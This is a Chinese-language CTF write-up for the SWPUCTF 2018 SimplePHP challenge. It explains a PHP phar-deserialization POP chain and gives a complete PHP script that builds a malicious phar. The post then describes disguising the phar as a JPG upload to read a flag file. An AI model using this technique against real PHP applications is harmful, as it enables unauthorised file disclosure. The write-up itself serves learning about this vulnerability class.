---
title: '[SWPUCTF 2018]SimplePHP'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-09-13 19:30:05
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/37775.jpg
---
[SWPUCTF 2018]SimplePHP--phar的反序列化
做到了读取源码那一步，上传基本都试了没法绕过，反序列化也没有unserialize，不会做了。看了wp知道是phar的反序列化，之前没遇到过，还能接受QAQ。

http://932b924e-67a5-4d83-8b68-ee01c9ca4a5c.node3.buuoj.cn/file.php?file=function.php
function.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/97.png)

class.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/100.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/102.png)

构造pop链
首先是找使链触发得魔术方法。
C1e4r类中有__destruct(),

__destruct()是PHP中的析构方法，在对象被销毁时被调用，程序结束时会被自动调用销毁对象。

函数中发现了echo，那么要利用echo $this->test。

public function __destruct()
{
   $this->test = $this->str;
   echo $this->test;
}

show类有__toString(),

__toString方法在将一个对象转化成字符串时被自动调用，比如进行echo，print操作时会被调用并返回一个字符串。

利用$this->str['str']->source;

public function __toString()
{
   $content = $this->str['str']->source;
   return $content;
}

Test类有__get（）

__get（）当未定义的属性或没有权限访问的属性被访问时该方法会被调用。

利用 $this->get --> $this->file_get($value); -->base64_encode(file_get_contents($value));

public function __get($key)
{
   return $this->get($key);
		
}
public function get($key)
{
   if(isset($this->params[$key])) {
            $value = $this->params[$key];
		} else {
            $value = "index.php";
        }
        return $this->file_get($value);
}
public function file_get($value)
{
       $text = base64_encode(file_get_contents($value));
       return $text;
}

其中调用了file_get_contents($value)函数的file_get函数很重要，一般看到调用了file_get_contents就可以认为这个是pop链的结束。

public function file_get($value)
{
       $text = base64_encode(file_get_contents($value));
       return $text;
}

整个pop链触发

C1e4r::destruct() --> Show::toString() --> Test::__get() 。

根据pop链构造exp

<?php
class C1e4r
{
    public $test;
    public $str;
}

class Show
{
    public $source;
    public $str;
}
class Test
{
    public $file;
    public $params;

}

$c1e4r = new C1e4r();
$show = new Show();
$test = new Test();
$test->params['source'] = "/var/www/html/f1ag.php";
$c1e4r->str = $show;   //利用  $this->test = $this->str; echo $this->test;
$show->str['str'] = $test;  //利用 $this->str['str']->source;


$phar = new Phar("exp.phar"); //.phar文件
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >'); //固定的
$phar->setMetadata($c1e4r); //触发的头是C1e4r类，所以传入C1e4r对象
$phar->addFromString("exp.txt", "test"); //随便写点什么生成个签名
$phar->stopBuffering();

?>

本地生成exp.phar，抓包改成jpg上传。

访问/uplaod/可以直接看到文件名称不用去自己拼。

包含上传的文件

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/107.png)

得到flag。
